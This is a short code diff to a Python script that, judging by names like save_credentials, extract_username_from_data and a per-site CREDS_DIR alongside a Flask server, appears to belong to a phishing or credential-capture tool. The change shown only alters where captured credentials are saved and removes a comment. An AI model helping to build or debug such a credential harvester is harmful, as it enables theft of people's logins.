@@ -87,7 +87,8 @@ def extract_username_from_data(data):
     return "unknown"
 
 def save_credentials(data, site, session_id):
-    site_dir = os.path.join(CREDS_DIR, site)
+    # === FIXED: Save directly into CREDS_DIR (which is already the site folder) ===
+    site_dir = CREDS_DIR  
     os.makedirs(site_dir, exist_ok=True)
     
     username = extract_username_from_data(data)
@@ -249,7 +250,6 @@ if __name__ == '__main__':
         PORT=port
     )
     
-    # CRITICAL FIX: stdout=None lets Flask print to your PowerShell terminal
     proc = subprocess.Popen(
         [sys.executable, "-c", server_script],
         stdout=None,
